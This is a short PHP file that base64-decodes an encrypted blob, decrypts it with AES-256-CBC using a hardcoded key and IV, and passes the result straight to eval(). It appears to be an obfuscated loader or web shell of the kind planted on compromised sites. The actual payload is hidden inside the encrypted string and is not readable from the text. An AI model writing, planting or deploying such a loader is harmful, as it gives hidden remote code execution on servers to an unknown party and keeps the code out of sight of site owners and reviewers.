<?php
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}

function e7061($e){
    $ed = base64_decode($e);
    $n = openssl_decrypt("$ed","AES-256-CBC","1122334455667788",0,"1122334455667788");
    return $n;
}

$e7091="ZWtDcHh0d0FZYXVYOWZlV0VKUUZVeWJzZEFLYndReGIrNjhaRWRaQ1BneThOYTlFeGdFY1RHVUNNcW1tNVZRR2FJdjYvUlkwdGxnbDJWRUFLbU9iNG1MTjA2MWFPKys2VlFxQkdPNEVIY1ZVRjZ5dHdlNHZobkJVVFhxTjdIaUkyekpWVUVKT3p6T2hQbFFBOUl1OGVRPT0=";
eval(e7061($e7091));

